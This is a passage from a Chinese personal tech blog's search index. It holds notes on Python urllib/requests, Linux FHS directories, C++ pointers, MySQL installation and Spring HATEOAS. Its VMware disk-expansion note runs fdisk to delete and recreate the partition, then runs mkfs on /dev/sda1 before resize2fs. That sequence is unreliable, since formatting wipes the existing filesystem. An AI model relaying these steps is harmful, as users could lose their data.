punctuation">:</span> 100%<span class="token punctuation">;</span>//宽度<span class="token property">height</span><span class="token punctuation">:</span> 181px<span class="token punctuation">;</span>//高度<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JS">JS</h3><ul><li><p>动态交互</p></li><li><p>script标签与html交互</p></li></ul><h2 id="基本库的使用">基本库的使用</h2><h3 id="urllib">urllib</h3><blockquote><p><a href="https://docs.python.org/3/library/urllib.html">https://docs.python.org/3/library/urllib.html</a></p></blockquote><ul><li><p>request</p><p>模拟发送请求</p><ul><li><p><code>urlopen(url, data=None, [timeout, ], cafile=None, capath=None, cadefault=False, context=None)</code></p></li><li><p>Request</p><p><code>class urllib.request.Request(url, data=None, headers=&#123;&#125;, origin_req_host=None, unverifiable=False, method=None)</code></p></li><li><p>Handler</p></li><li><p>Opener</p></li></ul></li><li><p>error</p><ul><li>各种error：HTTPError、URLError</li><li>异常里的属性<ul><li>错误状态码、原因、headers</li></ul></li></ul></li><li><p>parse</p><p>处理url</p><ul><li><p><code>urllib.parse.urlparse(urlstring, scheme='', allow_fragments=True)</code></p><blockquote><p>urlstring 必填，scheme协议，优先采取urlstring 里的协议</p></blockquote></li><li><p>urlunparse</p><blockquote><p>合并</p></blockquote></li><li><p><code>urllib.parse.urlsplit</code>(<em>urlstring</em>, <em>scheme=‘’</em>, <em>allow_fragments=True</em>)</p></li><li><p>urlunsplit</p><blockquote><p>长度5</p></blockquote></li><li><p><code>urllib.parse.urljoin</code>(<em>base</em>, <em>url</em>, <em>allow_fragments=True</em>)</p></li><li><p>urlencode()</p></li></ul><blockquote><p>字典转GET参数</p></blockquote><ul><li>parse_qs()</li></ul><blockquote><p>转存成字典类型</p></blockquote><ul><li>parse_qsl()</li></ul><blockquote><p>元组列表</p></blockquote></li><li><p>quote()</p></li></ul><blockquote><p>转中文为URL编码</p></blockquote><ul><li><p>robotparser</p><p>听起来挺有用，但实际上…</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>robotparser <span class="token keyword">import</span> RobotFileParser<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> urlopenrp <span class="token operator">=</span> RobotFileParser<span class="token punctuation">(</span><span class="token punctuation">)</span>rp<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.zhihu.com/robots.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'https://www.zhihu.com/topic/19661050/hot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">"https://www.zhihu.com/question/448199854/answer/1882163142"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>set_url ：用来设置 robots.txt 文件的链接。如果在创建 RobotFileParser 对象时传入了链接，那么就不需要再使用这个方法设置了。</li><li>read：读取 robots.txt 文件并进行分析。注意，这个方法执行一个读取和分析操作，如果不调用这个方法，接下来的判断都会为 False，所以一定记得调用这个方法。这个方法不会返回任何内容，但是执行了读取操作。<br>parse：用来解析 robots.txt 文件，传入的参数是 robots.txt 某些行的内容，它会按照 robots.txt 的语法规则来分析这些内容。</li><li>can_fetch：该方法传入两个参数，第一个是 User-agent，第二个是要抓取的 URL。返回的内容是该搜索引擎是否可以抓取这个 URL，返回结果是 True 或 False.</li><li>mtime：返回的是上次抓取和分析 robots.txt 的时间，这对于长时间分析和抓取的搜索爬虫是很有必要的，你可能需要定期检查来抓取最新的 robots.txt。</li><li>modified：它同样对长时间分析和抓取的搜索爬虫很有帮助，将当前时间设置为上次抓取和分析 robots.txt 的时间。</li></ul></li></ul><h3 id="requests">requests</h3><blockquote><p>在urllib中，我们可以通过handler,opener完成cookie认证之类的操作，但在requests里，功能更加强大（反正内置urllib3）</p></blockquote><p>直接贴接口文档<code>https://docs.python-requests.org/zh_CN/latest/api.html#id2</code></p><ul><li>response.status_code</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"># 信息性状态码  100: ('continue',),  101: ('switching_protocols',),  102: ('processing',),  103: ('checkpoint',),  122: ('uri_too_long', 'request_uri_too_long'),  # 成功状态码  200: ('ok', 'okay', 'all_ok', 'all_okay', 'all_good', '\\o/', '✓'),  201: ('created',),  202: ('accepted',),  203: ('non_authoritative_info', 'non_authoritative_information'),  204: ('no_content',),  205: ('reset_content', 'reset'),  206: ('partial_content', 'partial'),  207: ('multi_status', 'multiple_status', 'multi_stati', 'multiple_stati'),  208: ('already_reported',),  226: ('im_used',),  # 重定向状态码  300: ('multiple_choices',),  301: ('moved_permanently', 'moved', '\\o-'),  302: ('found',),  303: ('see_other', 'other'),  304: ('not_modified',),  305: ('use_proxy',),  306: ('switch_proxy',),  307: ('temporary_redirect', 'temporary_moved', 'temporary'),  308: ('permanent_redirect',        'resume_incomplete', 'resume',), # These 2 to be removed in 3.0  # 客户端错误状态码  400: ('bad_request', 'bad'),  401: ('unauthorized',),  402: ('payment_required', 'payment'),  403: ('forbidden',),  404: ('not_found', '-o-'),  405: ('method_not_allowed', 'not_allowed'),  406: ('not_acceptable',),  407: ('proxy_authentication_required', 'proxy_auth', 'proxy_authentication'),  408: ('request_timeout', 'timeout'),  409: ('conflict',),  410: ('gone',),  411: ('length_required',),  412: ('precondition_failed', 'precondition'),  413: ('request_entity_too_large',),  414: ('request_uri_too_large',),  415: ('unsupported_media_type', 'unsupported_media', 'media_type'),  416: ('requested_range_not_satisfiable', 'requested_range', 'range_not_satisfiable'),  417: ('expectation_failed',),  418: ('im_a_teapot', 'teapot', 'i_am_a_teapot'),  421: ('misdirected_request',),  422: ('unprocessable_entity', 'unprocessable'),  423: ('locked',),  424: ('failed_dependency', 'dependency'),  425: ('unordered_collection', 'unordered'),  426: ('upgrade_required', 'upgrade'),  428: ('precondition_required', 'precondition'),  429: ('too_many_requests', 'too_many'),  431: ('header_fields_too_large', 'fields_too_large'),  444: ('no_response', 'none'),  449: ('retry_with', 'retry'),  450: ('blocked_by_windows_parental_controls', 'parental_controls'),  451: ('unavailable_for_legal_reasons', 'legal_reasons'),  499: ('client_closed_request',),  # 服务端错误状态码  500: ('internal_server_error', 'server_error', '/o\\', '✗'),  501: ('not_implemented',),  502: ('bad_gateway',),  503: ('service_unavailable', 'unavailable'),  504: ('gateway_timeout',),  505: ('http_version_not_supported', 'http_version'),  506: ('variant_also_negotiates',),  507: ('insufficient_storage',),  509: ('bandwidth_limit_exceeded', 'bandwidth'),  510: ('not_extended',),  511: ('network_authentication_required', 'network_auth', 'network_authentication')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="正则表达式">正则表达式</h2><blockquote><p>如何筛选我想要的数据</p></blockquote><ul><li><p>表达式搜索</p><p><a href="https://any86.github.io/any-rule/">https://any86.github.io/any-rule/</a></p></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spider </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> requests </tag>
            
            <tag> urllib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware下deepin的磁盘拓展</title>
      <link href="/2021/04/21/2021-04-21-VMware%E4%B8%8Bdeepin%E7%9A%84%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/"/>
      <url>/2021/04/21/2021-04-21-VMware%E4%B8%8Bdeepin%E7%9A%84%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h2 id="系统">系统</h2><ul><li>win 10</li><li>deepin20</li><li>VMware16</li></ul><h2 id="问题解决">问题解决</h2><blockquote><p>仅用于个人问题的记录</p></blockquote><ul><li><p>VMware扩充虚拟硬盘</p></li><li><p>进入deepin进行操作</p><h3 id="删除已有硬盘分区">删除已有硬盘分区</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fdisk &#x2F;dev&#x2F;sdaCommand (m for help): dSelected partition 1Command (m for help): dNo partition is defined yet!Command (m for help): w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>选择d：删除分区</li><li>选择w：保存</li></ul><h3 id="分区">分区</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fdisk &#x2F;dev&#x2F;sda&lt;&lt;&#39;COMMENT&#39;Command (m for help): nPartition type:   p   primary (0 primary, 0 extended, 4 free)   e   extendedSelect (default p): pPartition number (1-4, default 1): 1First sector (2048-31703039, default 2048): Using default value 2048Last sector, +sectors or +size&#123;K,M,G&#125; (2048-31703039, default 31703039): Using default value 31703039Command (m for help): w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>选择n：创建分区</li><li>选择p：主分区</li><li>选择e：逻辑分区</li><li>Partition number：分区个数。这里选择分为一个区</li><li>First sector：第一块扇区号。这里以2048为开始<ul><li>With the death of the legacy BIOS (ok, its not quite dead yet) and its replacement with EFI BIOS, a special boot partitionis needed to allow EFI systems to boot in EFI mode. Starting the first partition at sector 2048 leaves 1Mb for the EFI boot code. Modern partitioning tools do this anyway and fdisk has been updated to follow suit. 大意为，由于EFI的兴起，要给EFI 代码留磁盘最开始的1M空间</li></ul></li><li>Last sector：最后一块扇区号。这里默认代表全部的扇区，也可以制定大小，例如<code>+1024m</code>，即分出<code>1G</code>空间</li><li>选择w：保存退出</li></ul></li></ul><h3 id="格式化">格式化</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkfs -t ext4 &#x2F;dev&#x2F;sda1resize2fs &#x2F;dev&#x2F;sda1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="重启deepin解决问题">重启deepin解决问题</h3><h2 id="参考资料">参考资料</h2><p><a href="https://o-my-chenjian.com/2017/05/10/Play-Disk-On-Linux/">https://o-my-chenjian.com/2017/05/10/Play-Disk-On-Linux/</a></p>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> disk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware网络连接</title>
      <link href="/2021/04/21/2021-04-21-VMware%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"/>
      <url>/2021/04/21/2021-04-21-VMware%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>windows服务</li><li>重启VMware DHCP Service</li><li>重启VMware NAT Service</li></ul>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>磁盘分区与文件系统</title>
      <link href="/2021/04/20/2021-04-20-%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/04/20/2021-04-20-%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="磁盘分区">磁盘分区</h2><ul><li>分区只是针对64Bytes的分区表进行设置</li></ul><h3 id="为什么分区">为什么分区</h3><ul><li>安全性（考虑重装window是C盘的情况）</li><li>提高读取性能</li></ul><h3 id="Linux下磁盘分区的重要性">Linux下磁盘分区的重要性</h3><ul><li><p>mount（挂载）</p><p>目录树的结构与磁盘内的数据对应</p></li><li><p>分区方法</p></li></ul><h2 id="目录配置">目录配置</h2><h3 id="FHS标准">FHS标准</h3><table><thead><tr><th></th><th>可分享的(shareable)</th><th>不可分享的(unshareable)</th></tr></thead><tbody><tr><td>不变的(static)</td><td>/usr(软件放置处)</td><td>/etc(配置文件)</td></tr><tr><td>/opt(第三方协力软件)</td><td>/boot(开机与核心档)</td><td></td></tr><tr><td>可变动的(variable)</td><td>/var/mail(使用者邮件信息)</td><td>/var/run（程序相关）</td></tr><tr><td>/var/spool/news（新闻群组）</td><td>/var/lock(程序相关)</td><td></td></tr></tbody></table><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">root@youname-PC:&#x2F;mnt&#x2F;hgfs# tree &#x2F; -L 1&#x2F;├── bin -&gt; usr&#x2F;bin├── boot├── dev├── etc├── home├── lib -&gt; usr&#x2F;lib├── lib32 -&gt; usr&#x2F;lib32├── lib64 -&gt; usr&#x2F;lib64├── libx32 -&gt; usr&#x2F;libx32├── lost+found├── media├── mnt├── opt├── proc├── root├── run├── sbin -&gt; usr&#x2F;sbin├── srv├── sys├── tmp├── usr└── var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>在FHS标注下只有三个目录应该放置什么数据</p><ul><li>/(root)</li><li>/usr(unix software resource)</li><li>/var(variable)/</li></ul></li></ul><h3 id="其他目录">其他目录</h3><h4 id="bin">/bin</h4><blockquote><p>系统有很多放置可执行文件的目录，但/bin比较特殊。因为/bin放置的是在==单人维护模式下还能够被操作==的指令。 在/bin下面的指令可以被root与一般 帐号所使用，主要有：cat, chmod, chown, date, mv, mkdir, cp, bash等等常 用的指令。</p></blockquote><h4 id="boot">\boot</h4><pre><code>&gt; 这个目录主要在放置==开机==会使用到的文件，包括Linux核心文件以及开机菜 单与开机所需配置文件等等。 Linux kernel常用的文件名为：vmlinuz，如果 使用的是grub2这个开机管理程序， 则还会存在/boot/grub2/</code></pre><h4 id="dev">/dev</h4><blockquote><p>在Linux系统上，任何设备与周边设备都是以文件的型态存在于这个目录当 中的。 你只要通过存取这个目录下面的某个文件，就等于存取某个设备. 比较重要的文件有/dev/null, /dev/zero, /dev/tty, /dev/loop, /dev/sd</p></blockquote><h4 id="etc">/etc</h4><blockquote><p>系统主要的==配置文件==几乎都放置在这个目录内，例如人员的帐号密码档、 各种服务的启始档等等。一般来说，这个目录下的各文件属性是可以让一般 使用者查阅的， 但是只有root有权力修改。FHS建议不要放置可可执行文件 （binary）在这个目录中喔。比较重要的文件有： /etc/modprobe.d/, /etc/passwd, /etc/fstab, /etc/issue 等等。另外 FHS 还规范几个重要的目录 最好要存在 /etc/ 目录下：/etc/opt（必要）：这个目录在放置第三方协力 软件 /opt 的相关配置文件 /etc/X11/（建议）：与 X Window 有关的各种配 置文件都在这里，尤其是 xorg.conf 这个 X Server 的配置文件。 /etc/sgml/ （建议）：与 SGML 格式有关的各项配置文件 /etc/xml/（建议）：与 XML 格式有关的各项配置文件</p></blockquote><h4 id="lib">/lib</h4><blockquote><p>系统的函数库非常的多，而/lib放置的则是==在开机时会用到的函数库==， 以及 在/bin或/sbin下面的指令会调用的函数库而已。 什么是函数库呢？你可以将 他想成是“外挂”，某些指令必须要有这些“外挂”才能够顺利完成程序的执行 之意。 另外 FSH 还要求下面的目录必须要存在：==/lib/modules/==：这个目录 主要放置可抽换式的核心相关模块（驱动程序）</p></blockquote><h4 id="media">/media</h4><blockquote><p>media是“媒体”的英文，顾名思义，这个/media下面放置的就是==可移除的设备==。 包括软盘、光盘、DVD等等设备都暂时挂载于此。常见的文件名 有：/media/floppy, /media/cdrom等等。</p></blockquote><h4 id="mnt">/mnt</h4><blockquote><p>如果你想要==暂时挂载==某些额外的设备，一般建议你可以放置到这个目录中。 在远古时期，这个目录的用途与/media相同。只是有了/media之后，这个目录就用来暂时挂载用了。</p></blockquote><h4 id="opt">/opt</h4><blockquote><p>这个是给==第三方协力软件==放置的目录。举例来说，KDE这个桌面管理系统是一个独立的计划，不过他可以安装到Linux系 统中，因此KDE的软件就建议放置到此目录下了。 另外，如果你想要自行安装额外的软件（非原本的distribution提供的），那么也能够将你的软件安 装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在/usr/local目录。</p></blockquote><h4 id="run">/run</h4><blockquote><p>早期的 FHS 规定系统开机后所产生的各项信息应该要放置到 /var/run 目录 下，新版的 FHS 则规范到 /run 下面。</p></blockquote><h4 id="sbin-usr-sbin">/sbin -&gt; usr/sbin</h4><blockquote><p>里面包括了==开机、修复、还原系统==所需要的指令。 至于某些==服务器软件程序==，一般则放置到/usr/sbin/当中。至于本机自行安装的软件所产生的系统可执行文件（system binary）， 则放置到/usr/local/sbin/ 当中了。常见的指令包括：fdisk, fsck, ifconfig, mkfs等等。</p></blockquote><h4 id="srv">/srv</h4><blockquote><p>srv可以视为“service”的缩写，是一些网络服务启动之后，==这些服务所需要 取用的数据目录==。 常见的服务例如WWW, FTP等等。举例来说，WWW服 务器需要的网页数据就可以放置在/srv/www/里面。 不过，系统的服务数据 如果尚未要提供给网际网络任何人浏览的话，默认还是建议放置到 /var/lib 下面即可</p></blockquote><h4 id="tmp">/tmp</h4><blockquote><p>这是让一般==使用者或者是正在执行的程序暂时放置文件==的地方。 这个目录 是任何人都能够存取的，所以你需要定期的清理一下。当然，重要数据不可 放置在此目录啊！ 因为FHS甚至建议在开机时，应该要将/tmp下的数据都删除</p></blockquote><h4 id="usr">/usr</h4><ul><li><p>默认软件全在这里</p></li><li><p>/bin</p></li></ul><blockquote><p>所有一般用户能够使用的指令都放在这里！目前新的 CentOS 7 已经将 全部的使用者指令放置于此，而使用链接文件的方式将 /bin 链接至此！ 也就是说， /usr/bin 与 /bin 是一模一样</p></blockquote><ul><li><p>/lib</p></li><li><p>/local</p></li></ul><blockquote><p>系统管理员在==本机自行安装自己下载的软件==（非distribution默认提供 者），建议安装到此目录， 这样会比较便于管理。举例来说，你的 distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于/usr/local/目录下</p></blockquote><ul><li><p>/sbin</p></li><li><p>/share</p></li></ul><blockquote><p>主要放置==只读架构的数据文件==，当然也包括==共享文件==。在这个目录下放 置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文字文 件嘛！在此目录下常见的还有这些次目录：/usr/share/man：线上说明 文档 /usr/share/doc：软件杂项的文件说明 /usr/share/zoneinfo：与时 区有关的时区文件</p></blockquote><ul><li><p>/game</p></li><li><p>/include</p></li></ul><blockquote><p>c/c++等程序语言的文件开始（header）与包含档（include）放置处， 当我们以tarball方式 （*.tar.gz 的方式安装软件）安装某些数据时，会 使用到里头的许多包</p></blockquote><ul><li>/src</li></ul><blockquote><p>一般源代码建议放置到这里，src有source的意思。至于核心源代码则 建议放置到/usr/src/linux/目录</p></blockquote><h4 id="var">/var</h4><ul><li>/lib</li></ul><blockquote><p>程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下 各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置 到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm</p></blockquote><ul><li><p>/lock</p></li><li><p>/log</p></li></ul><blockquote><p>登录文件放置位置</p></blockquote><ul><li>/spool</li></ul><h4 id="home">/home</h4><blockquote><p>使用者文件夹</p></blockquote><ul><li>/proc</li></ul><blockquote><p>个目录本身是一个“虚拟文件系统（virtual filesystem）”.他放置的数 据都是在内存当中， 例如系统核心、行程信息（process）、周边设备的 状态及网络状态等等。因为这个目录下的数据都是在内存当中， 所以本身 不占任何硬盘空间啊！比较重要的文件例如：/proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, /proc/net/* 等等。</p></blockquote><ul><li>/sys</li></ul><blockquote><p>这个目录其实跟/proc非常类似，也是一个虚拟的文件系统，主要也是记录 核心与系统硬件信息较相关的信息。 包括目前已载入的核心模块与核心侦 测到的硬件设备信息等等。这个目录同样不占硬盘容量</p></blockquote><h2 id="文件系统">文件系统</h2><h3 id="磁盘与容量">磁盘与容量</h3><ul><li><code>df:列出文件系统的整体磁盘使用量</code></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">用法：df [选项]... [文件]...  -a, --all             include pseudo, duplicate, inaccessible file systems  -B, --block-size&#x3D;SIZE  scale sizes by SIZE before printing them; e.g.,                           &#39;-BM&#39; prints sizes in units of 1,048,576 bytes;                           see SIZE format below  -h, --human-readable  print sizes in powers of 1024 (e.g., 1023M)  -H, --si              print sizes in powers of 1000 (e.g., 1.1G)  -i, --inodes          显示inode 信息而非块使用量  -k                    即--block-size&#x3D;1K  -l, --local           只显示本机的文件系统      --no-sync         取得使用量数据前不进行同步动作(默认)      --output[&#x3D;FIELD_LIST]  use the output format defined by FIELD_LIST,                               or print all fields if FIELD_LIST is omitted.  -P, --portability     use the POSIX output format      --sync            invoke sync before getting usage info      --total           elide all entries insignificant to available space,                          and produce a grand total  -t, --type&#x3D;TYPE       limit listing to file systems of type TYPE  -T, --print-type      print file system type  -x, --exclude-type&#x3D;TYPE   limit listing to file systems not of type TYPE  -v                    (ignored)      --help            显示此帮助信息并退出      --version         显示版本信息并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>du: 评估文件系统的磁盘使用量</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">用法：du [选项]... [文件]...　或：du [选项]... --files0-from&#x3D;FSummarize disk usage of the set of FILEs, recursively for directories.  -a, --all             列出所有的文件与目录容量,因为默认仅统计目录下面的文件量      --apparent-size   print apparent sizes, rather than disk usage; although                          the apparent size is usually smaller, it may be                          larger due to holes in (&#39;sparse&#39;) files, internal                          fragmentation, indirect blocks, and the like  -H                    equivalent to --dereference-args (-D)  -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)      --inodes          list inode usage information instead of block usage  -S, --separate-dirs   不包含子目录      --si              like -h, but use powers of 1000 not 1024  -s, --summarize       display only a total for each argument<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> disk </tag>
            
            <tag> file system </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针类型</title>
      <link href="/2021/04/04/2021-04-04-%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/04/04/2021-04-04-%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Const指针">Const指针</h2><blockquote><p>将const限定符用于指针，以防止指向的原始数据被修改。程序传递基本类型（如int 或 double ）时，它将按值传递，以便函数使用副本，保护原始数据</p></blockquote><p><a href="https://imgtu.com/i/cugPKJ"><img src="https://z3.ax1x.com/2021/04/04/cugPKJ.png" alt="cugPKJ.png"></a></p><p><a href="https://imgtu.com/i/cu2KYV"><img src="https://z3.ax1x.com/2021/04/04/cu2KYV.png" alt="cu2KYV.png"></a><br><a href="https://imgtu.com/i/cu2uF0"><img src="https://z3.ax1x.com/2021/04/04/cu2uF0.png" alt="cu2uF0.png"></a><br><a href="https://imgtu.com/i/cu2moq"><img src="https://z3.ax1x.com/2021/04/04/cu2moq.png" alt="cu2moq.png"></a></p><h2 id="参数传递">参数传递</h2><table><thead><tr><th>传递机制</th><th>形参</th><th>实参</th><th>特点</th></tr></thead><tbody><tr><td>传值调用</td><td>定义为变量</td><td>同类型的常量、变量、表达式</td><td>数据单向传递</td></tr><tr><td>传地址调用</td><td>定义为指针</td><td>与形参相匹配的地址</td><td>可以实现数据的双向传递</td></tr><tr><td>引用调用</td><td>定义为引用</td><td>与形参同类型的变量</td><td>数据双向传递</td></tr></tbody></table><blockquote><p>C++允许按值传递结构，也允许传递地址。但按值传递可以自动保护原始数据，以时间和内存为代价。按地址传递可节省时间和内存，但无法保护原始数据，除非使用了const限定符。另外，按值传递意味着可以使用常规的结构成员表示法，但传递指针则必须使用间接成员运算符。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pointer&amp;structure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装MySQL</title>
      <link href="/2021/03/24/2021-03-24-%E5%AE%89%E8%A3%85MySQL/"/>
      <url>/2021/03/24/2021-03-24-%E5%AE%89%E8%A3%85MySQL/</url>
      
        <content type="html"><![CDATA[<center>协同开发要用统一的标准，引起的MySQL之痛<center><blockquote><p>不要问我为什么不能在原有的基础上装，我也没试过:cry:</p></blockquote><span id="more"></span><h2 id="卸载MySQL">卸载MySQL</h2><ul><li>停止MySQL服务</li><li>在/bin下 运行<code>mysqld --remove</code></li></ul><h2 id="下载MySQL">下载MySQL</h2><ul><li>一定要确保自己解压后的bin 目录上有mysql.exe，不然怎么执行<code>mysqld</code> 都没用</li><li>解压目录随便放，我在D盘</li></ul><h2 id="安装MySQL">安装MySQL</h2><ul><li><p>先改环境变量，删除旧的，添加新的，在系统变量下的Path</p><p><code>………………\bin</code></p></li><li><p>管理员运行cmd，切换到bin目录下</p></li><li><p>然后<code>mysqld --initialize --console</code></p><p>顺便记下最后弹出的root账户密码，一般比较复杂</p></li><li><p>安装服务</p><p><code>mysqld --install</code></p></li><li><p>运行服务</p><p><code>net start mysql</code></p></li><li><p>登录，修改</p><p><code>mysql -u root -p</code></p><p><code> UPDATE user SET password = PASSWORD('新密码') WHERE user = 'root';</code></p></li><li><p>完成</p></li></ul><h2 id="其他问题">其他问题</h2><h3 id="连接MySQL的时区问题">连接MySQL的时区问题</h3><p><code>?serverTimezone=Asia/Shanghai</code></p><h3 id="Loading……">Loading……</h3>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HATEOAS</title>
      <link href="/2021/03/14/2021-03-14-HATEOAS/"/>
      <url>/2021/03/14/2021-03-14-HATEOAS/</url>
      
        <content type="html"><![CDATA[<p><strong>Richardson成熟度模型</strong></p><ul><li>Level3-Hypermedia Controls</li></ul><p><strong>HATEEOAS</strong></p><ul><li><p>Hypermedia As The Engine Of Application State</p></li><li><p>REST统一的接口的必要组成部分</p></li><li><p>表述中的超链接会提供服务所需的各种REST接口信息</p></li></ul><p><strong>传统的服务契约</strong></p><ul><li>必须事先规定服务的地址与格式</li></ul><p><strong>常用的超链接类型</strong></p><table><thead><tr><th>REL</th><th>描述</th></tr></thead><tbody><tr><td>self</td><td>指向当前资源本身的链接</td></tr><tr><td>edit</td><td>指向一个可以编辑当前资源的链接</td></tr><tr><td>collection</td><td>如果当前资源包含在某个集合中，指向该集合的链接</td></tr><tr><td>search</td><td>指向一个搜索当前资源与相关资源的链接</td></tr><tr><td>related</td><td>指向一个与当前资源相关的链接</td></tr><tr><td>first</td><td>集合遍历相关的类型，指向第一个资源的链接</td></tr><tr><td>last</td><td>集合遍历相关的类型，指向最后一个资源的链接</td></tr><tr><td>previous</td><td>集合遍历相关的类型，指向上一个资源的链接</td></tr><tr><td>next</td><td>集合遍历相关的类型，指向下一个资源的链接</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HATEOAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Data REST 实现超媒体服务</title>
      <link href="/2021/03/14/2021-03-14-Spring-Data-REST-%E5%AE%9E%E7%8E%B0%E8%B6%85%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1/"/>
      <url>/2021/03/14/2021-03-14-Spring-Data-REST-%E5%AE%9E%E7%8E%B0%E8%B6%85%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p><strong>Spring Boot 依赖</strong></p><ul><li>spring-boot-starter-data-rest</li></ul><p><strong>常用注解与类</strong></p><ul><li>@RepositoryRestResource</li><li>Resource&lt;T&gt;</li><li>PageResource&lt;T&gt;</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RestTemplate 访问Web资源</title>
